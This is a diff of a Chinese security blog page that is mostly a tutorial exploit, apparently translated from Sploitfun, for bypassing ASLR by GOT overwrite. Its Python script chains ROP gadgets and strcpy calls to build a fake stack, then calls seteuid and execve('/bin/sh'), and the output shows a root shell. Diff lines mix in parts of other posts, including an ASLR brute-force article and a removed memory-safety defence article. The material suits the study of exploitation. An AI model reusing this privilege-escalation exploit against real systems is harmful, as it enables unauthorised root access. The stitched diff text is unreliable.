class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#GOT overwrite using ROP gadgets</div><div class="line">'''</div><div class="line"> G1: 0x0804849e: addl %eax, 0x5D5B04C4(%ebx) ; ret ;</div><div class="line"> G2: 0x080484a2: popl %ebx ; pop ebp; ret ;</div><div class="line"> G3: 0x????????: popl %eax ; ret ; (NOT found)</div><div class="line"> G4: 0x080485b3: mov 0x34(%esp),%eax...</div><div class="line"> G5: 0x08048380: pop ebx ; ret ;</div><div class="line"> G6: 0x080485cd: pop esi ; pop edi ; pop ebp ; ret ;</div><div class="line"> G7: 0x08048498: movb $0x1,0x804a028...</div><div class="line">'''</div><div class="line"></div><div class="line">g1 = 0x0804849e</div><div class="line">g2 = 0x080484a2</div><div class="line">g4 = 0x080485b3</div><div class="line">g5 = 0x08048380</div><div class="line">g6 = 0x080485cd</div><div class="line">g7 = 0x08048498</div><div class="line">dummy = 0xdeadbeef</div><div class="line">esi = 0x01020101</div><div class="line">edi = 0x01020102</div><div class="line">ebx = 0x3fc9c18               #ebx = 0x8049f3c - (esi*4) + 0xe0</div><div class="line">off = 0xfffff530</div><div class="line"></div><div class="line">#Custom Stack</div><div class="line">#0x804a360 - Dummy EBP|seteuid@PLT|getuid@PLT|seteuid_arg|execve_arg1|execve_arg2|execve_arg3</div><div class="line">cust_esp = 0x804a360          #Custom stack base address</div><div class="line">cust_base_esp = 0x804a360     #Custom stack base address</div><div class="line">#seteuid@PLT 0x80483c0</div><div class="line">seteuid_oct1 = 0x8048143      #08</div><div class="line">seteuid_oct2 = 0x8048130      #04</div><div class="line">seteuid_oct3 = 0x8048355      #83</div><div class="line">seteuid_oct4 = 0x80481cb      #c0</div><div class="line">#getuid@PLT 0x80483b0</div><div class="line">getuid_oct1 = 0x8048143       #08</div><div class="line">getuid_oct2 = 0x8048130       #04</div><div class="line">getuid_oct3 = 0x8048355       #83</div><div class="line">getuid_oct4 = 0x80483dc       #b0</div><div class="line">#seteuid_arg 0x00000000</div><div class="line">seteuid_null_arg = 0x804a360</div><div class="line">#execve_arg1 0x804ac60</div><div class="line">execve_arg1_oct1 = 0x8048143  #08</div><div class="line">execve_arg1_oct2 = 0x8048130  #04 </div><div class="line">execve_arg1_oct3 = 0x8048f44  #AC </div><div class="line">execve_arg1_oct4 = 0x804819a  #60</div><div class="line">#execve_arg2 0x804ac68</div><div class="line">execve_arg2_oct1 = 0x8048143  #08</div><div class="line">execve_arg2_oct2 = 0x8048130  #04 </div><div class="line">execve_arg2_oct3 = 0x8048f44  #AC </div><div class="line">execve_arg2_oct4 = 0x80483a6  #68</div><div class="line">#execve_arg3 0x00000000</div><div class="line">execve_null_arg = 0x804a360</div><div class="line">execve_path_dst = 0x804ac60   #Custom stack location which contains execve_path "/bin/sh"</div><div class="line">execve_path_oct1 = 0x8048154  #/</div><div class="line">execve_path_oct2 = 0x8048157  #b</div><div class="line">execve_path_oct3 = 0x8048156  #i</div><div class="line">execve_path_oct4 = 0x804815e  #n</div><div class="line">execve_path_oct5 = 0x8048162  #s</div><div class="line">execve_path_oct6 = 0x80483a6  #h</div><div class="line">execve_argv_dst = 0x804ac68   #Custom stack location which contains execve_argv [0x804ac60, 0x0]</div><div class="line">execve_argv1_oct1 = 0x8048143 #08</div><div class="line">execve_argv1_oct2 = 0x8048130 #04 </div><div class="line">execve_argv1_oct3 = 0x8048f44 #AC </div><div class="line">execve_argv1_oct4 = 0x804819a #60</div><div class="line">strcpy_plt = 0x80483d0        #strcpy@PLT</div><div class="line">ppr_addr = 0x080485ce         #popl %edi ; popl %ebp ; ret ;</div><div class="line"></div><div class="line">#Stack Pivot</div><div class="line">pr_addr = 0x080484a3          #popl %ebp ; ret ;</div><div class="line">lr_addr = 0x08048569          #leave ; ret ;</div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack("&lt;I",num* 268 #Junk</div><div class="line">buf += conv(g7)               #movb $0x1,0x804a028; add esp, 0x04; pop ebx; pop ebp; ret;</div><div class="line">buf += conv(dummy)</div><div class="line">buf += conv(dummy)</div><div class="line">buf += conv(dummy)</div><div class="line">buf += conv(g6)               #pop esi; pop edi; pop ebp; ret;</div><div class="line">buf += conv(esi)              #esi</div><div class="line">buf += conv(edi)              #edi</div><div class="line">buf += conv(dummy)</div><div class="line">buf += conv(g5)               #pop ebx; ret;</div><div class="line">buf += conv(ebx)              #ebx</div><div class="line">buf += conv(g4)               #mov 0x34(%esp),%eax; ...</div><div class="line"></div><div class="line">for num in range(0,11):</div><div class="line"> buf += conv(dummy)</div><div class="line"></div><div class="line">buf += conv(g2)               #pop ebx; pop ebp; ret;</div><div class="line">ebx = 0xaaa99b40              #getuid@GOT-0x5d5b04c4</div><div class="line">buf += conv(ebx)</div><div class="line">buf += conv(off)</div><div class="line">buf += conv(g1)               #addl %eax, 0x5D5B04C4(%ebx); ret;</div><div class="line">#Custom Stack</div><div class="line">#Below stack frames are for strcpy (to copy seteuid@PLT to custom stack)</div><div class="line">cust_esp += 4                 #Increment by 4 to get past Dummy EBP.</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(seteuid_oct4)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(seteuid_oct3)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(seteuid_oct2)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(seteuid_oct1)</div><div class="line">#Below stack frames are for strcpy (to copy getuid@PLT to custom stack)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(getuid_oct4)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(getuid_oct3)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(getuid_oct2)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(getuid_oct1)</div><div class="line">#Below stack frames are for strcpy (to copy seteuid arg  to custom stack)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(seteuid_null_arg)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(seteuid_null_arg)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(seteuid_null_arg)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(seteuid_null_arg)</div><div class="line">#Below stack frames are for strcpy (to copy execve_arg1  to custom stack)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_arg1_oct4)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_arg1_oct3)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_arg1_oct2)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_arg1_oct1)</div><div class="line">#Below stack frames are for strcpy (to copy execve_arg2  to custom stack)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_arg2_oct4)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_arg2_oct3)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_arg2_oct2)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_arg2_oct1)</div><div class="line">#Below stack frames are for strcpy (to copy execve_arg3  to custom stack)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_null_arg)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_null_arg)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_null_arg)</div><div class="line">cust_esp += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(cust_esp)</div><div class="line">buf += conv(execve_null_arg)</div><div class="line">#Below stack frame is for strcpy (to copy execve path "/bin/sh" to custom stack @ loc 0x804ac60)</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_path_dst)</div><div class="line">buf += conv(execve_path_oct1)</div><div class="line">execve_path_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_path_dst)</div><div class="line">buf += conv(execve_path_oct2)</div><div class="line">execve_path_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_path_dst)</div><div class="line">buf += conv(execve_path_oct3)</div><div class="line">execve_path_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_path_dst)</div><div class="line">buf += conv(execve_path_oct4)</div><div class="line">execve_path_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_path_dst)</div><div class="line">buf += conv(execve_path_oct1)</div><div class="line">execve_path_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_path_dst)</div><div class="line">buf += conv(execve_path_oct5)</div><div class="line">execve_path_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_path_dst)</div><div class="line">buf += conv(execve_path_oct6)</div><div class="line">#Below stack frame is for strcpy (to copy execve argv[0] (0x804ac60) to custom stack @ loc 0x804ac68)</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_argv_dst)</div><div class="line">buf += conv(execve_argv1_oct4)</div><div class="line">execve_argv_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_argv_dst)</div><div class="line">buf += conv(execve_argv1_oct3)</div><div class="line">execve_argv_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_argv_dst)</div><div class="line">buf += conv(execve_argv1_oct2)</div><div class="line">execve_argv_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_argv_dst)</div><div class="line">buf += conv(execve_argv1_oct1)</div><div class="line">#Below stack frame is for strcpy (to copy execve argv[1] (0x0) to custom stack @ loc 0x804ac6c)</div><div class="line">execve_argv_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_argv_dst)</div><div class="line">buf += conv(execve_null_arg)</div><div class="line">execve_argv_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_argv_dst)</div><div class="line">buf += conv(execve_null_arg)</div><div class="line">execve_argv_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_argv_dst)</div><div class="line">buf += conv(execve_null_arg)</div><div class="line">execve_argv_dst += 1</div><div class="line">buf += conv(strcpy_plt)</div><div class="line">buf += conv(ppr_addr)</div><div class="line">buf += conv(execve_argv_dst)</div><div class="line">buf += conv(execve_null_arg)</div><div class="line">#Stack Pivot</div><div class="line">buf += conv(pr_addr)</div><div class="line">buf += conv(cust_base_esp)</div><div class="line">buf += conv(lr_addr)</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div><div class="line">Executing above exploit code gives us root shell (as shown below):</div></pre></td></tr></table></figure>
+<p>执行上面的漏洞利用代码就可以得到下面的root shell</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��ﾭ�ﾭ�ﾭ�ͅﾭހ�����ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭޢ�@���<span class="number">0</span>�����Ѓ΅d�ˁЃ΅e�U�Ѓ΅f�<span class="number">0</span>�Ѓ΅g�C�Ѓ΅h�܃Ѓ΅i�U�Ѓ΅j�<span class="number">0</span>�Ѓ΅k�C�Ѓ΅l�`�Ѓ΅m�`�Ѓ΅n�`�Ѓ΅o�`�Ѓ΅p���Ѓ΅q�Ѓ΅r�<span class="number">0</span>�Ѓ΅s�C�Ѓ΅t���Ѓ΅u�Ѓ΅v�<span class="number">0</span>�Ѓ΅w�C�Ѓ΅x�`�Ѓ΅y�`�Ѓ΅z�`�Ѓ΅&#123;�`�Ѓ΅`�T�Ѓ΅a�W�Ѓ΅b�V�Ѓ΅c�^�Ѓ΅d�T�Ѓ΅e�b�Ѓ΅f���Ѓ΅h���Ѓ΅i�Ѓ΅j�<span class="number">0</span>�Ѓ΅k�C�Ѓ΅l�`�Ѓ΅m�`�Ѓ΅n�`�Ѓ΅o�`���`�i�</div><div class="line">Len:<span class="number">1008</span></div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://media.blackhat.com/bh-us-10/whitepapers/Le/BlackHat-USA-2010-Le-Paper-Payload-already-inside-data-reuse-for-ROP-exploits-wp.pdf" target="_blank" rel="external">PAYLOAD ALREADY INSIDE: DATA REUSE FOR ROP EXPLOITS</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/bypassaslr-gotgor" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第三篇章(GOT覆盖与GOT解引用)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
 
       
     </div>
     <footer class="entry-meta entry-footer">
       
 	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/虚拟机监控/">虚拟机监控<span class="article-category-count">6</span></a>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用<span class="article-category-count">14</span></a>
 
 
       
   <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Libvmi/">Libvmi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASLR/">ASLR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/">ROP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
 
       
     </footer>
@@ -373,7 +381,7 @@
 <!-- Table of Contents -->
 
   
-    <article id="post-memorysafety-defense"  class="article article-type-post" itemscope itemprop="blogPost" >
+    <article id="post-bypassaslr-bruteforce"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
     
@@ -381,7 +389,7 @@
         
   
     <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170101/memorysafety-defense/">内存持久战之防御措施</a>
+      <a class="article-title" href="/20170102/bypassaslr-bruteforce/">绕过ASLR-第二篇章(暴力破解)</a>
     </h1>
   
 
@@ -389,68 +397,52 @@
     
     <div class="article-meta">
       
-	Posted on <a href="/20170101/memorysafety-defense/" class="article-date">
-	  <time datetime="2017-01-01T04:31:03.000Z" itemprop="datePublished">一月 1, 2017</time>
+	Posted on <a href="/20170102/bypassaslr-bruteforce/" class="article-date">
+	  <time datetime="2017-01-02T10:57:33.000Z" itemprop="datePublished">一月 2, 2017</time>
 	</a>
 
     </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
 <hr>
-<p><strong>CSysSec注</strong>： 本系列文章来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/02/24/memorywar-defense/" target="_blank" rel="external">个人博客</a>，主要介绍内存的安全性问题，以及相应的攻击模型及防御措施，对整个系统安全问题的概览有很大的帮助。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety-defense/" target="_blank" rel="external">内存持久战之防御措施</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/bypassaslr-bruteforce" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第二篇章(暴力破解)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
 <hr>
 <blockquote>
 <ul>
-<li>0X01 广泛部署的防御机制</li>
-<li>0X02 防御机制Step-by-step </li>
+<li>0X01 什么是暴力破解</li>
+<li>0X02 </li>
+<li>0X03</li>
 </ul>
 </blockquote>
-<p>继前两篇文章 <a href="http://www.csyssec.org/20170101/memorysafety/" target="_blank" rel="external">内存持久战-内存安全性</a>, <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战-攻击模型</a>, 再加上防御措施，才能算是完整的内存战争。本文首先介绍目前广泛部署的防御机制，然后根据 <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战-攻击模型</a> 每一步实施的攻击破坏介绍相对应的防御细节。</p>
-<h3 id="0X01-广泛部署的防御机制"><a href="#0X01-广泛部署的防御机制" class="headerlink" title="0X01 广泛部署的防御机制"></a>0X01 广泛部署的防御机制</h3><p>目前广泛部署的防御机制有栈粉碎性保护（Stack smashing protection)，DEP/W⊕X以及ASLR(Address Space Layout Randomization)。针对Windows平台，也提出了一些特殊的机制，比如 SafeSEH 与 SEHOP 用来保护堆的元数据和异常处理器。</p>
-<p>栈粉碎性保护,SafeSEH以及SEHOP的基本思想是在返回地址与缓冲区(比如函数入口）之间放置随机数作为哨兵（称为cookie或canary),在函数返回前先检测哨兵的值是否被篡改，以达到检测缓冲区溢出攻击的目的。这些机制都属于代码指针保护方式（code pointer integrity),主要检测一些特殊代码指针，如栈上的返回地址、异常处理器指针的完整性，然而对于直接修改（比如索引错误）却无能为力。有关stack smashing 可参考这篇文章 <a href="http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1" target="_blank" rel="external">Anatomy of a Stack Smashing Attack and How GCC Prevents It
-</a></p>
-<p>W⊕X（write XOR executable)属于DEP（data execution prevention)的子集，是不可执行数据（Non-executable data）与代码完整性(code integrity)的结合。所有现代CPU都支持设置不可执行页面权限，结合不可写代码权限，就可以实施W⊕X机制，很简单也很实际。然而无法防御ROP（return oriented programming),ROP指的是在将现有代码中的可复用代码（可以是现有的函数）以及一些指令序列（gadgets)连接起来实施恶意操作。有关ROP可参考这篇文章，<a href="https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf" target="_blank" rel="external">Return-oriented Programming:<br>Exploitation without Code Injection</a>.</p>
-<p>ASLR在下文会详细描述。</p>
-<h3 id="0X02-防御机制Step-by-step"><a href="#0X02-防御机制Step-by-step" class="headerlink" title="0X02 防御机制Step-by-step"></a>0X02 防御机制Step-by-step</h3><p>从目前提出的所有防御机制来看，可将其划分为两大类：概率性以及确定性防御。概率性机制用来随机化一些对象，如ISR(Instruction Set Randomization), ASLR(Address Space Randomizatioin)以及DSR(Data Space Randomization),可选手段相对较少。 确定性防御机制实施reference monitor, 有关reference monitor的定义可参考，<a href="https://en.wikipedia.org/wiki/Reference_monitor" target="_blank" rel="external">wikipedia page on reference monior</a>, 主要就是在参考验证机制上定义了一些设计要求。 其主要利用静态与动态注入技术，静态注入可在编译阶段实施，动态注入需要在运行时加入代码，损耗相对较大。有关注入技术，可参考前面的文章 <a href="http://www.chongh.wiki/blog/2015/12/18/pin-for-dynamic-binary-instrumentation/" target="_blank" rel="external">PIN for Dynamic Binary Instrumentation</a>。</p>
-<p>下面将针对攻击模型中实施的每个步骤介绍相对应的防御机制，每种防御机制对应每一步的攻击过程。<br>可以先去回顾一下 <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战之攻击模型</a> 的完整实施过程。注意，以下介绍的防御机制并没有时序关系,以横向关系依次描述。</p>
-<p><strong><em>Step 1&amp;2: Memory safety.</em></strong> 考虑完整的内存安全性，空间错误和时域错误都需要阻止。类型安全（Type-safe)的语言通过检查数组边界并使用自动垃圾回收来实施空间与时域安全性。对于非类型安全语言，可嵌入reference monitor针对非安全代码实施类似的策略，对象可以是源码、中间语言、二进制。</p>
-<p>针对空间安全，可跟踪指针边界，将指针结构体的表示方法扩展，加入额外信息。但是这种需要源码标注(annotation)，对于庞大的代码基是不实用的，甚至会改变内存结构带来二进制兼容性问题。可参考 <a href="https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf" target="_blank" rel="external">CCured</a> 项目。为解决兼容性问题，越来越多研究者开始追踪对象边界，不但要知道对象分配的内存区域边界，并利用指针运算而不是引用指针来保护指针边界。</p>
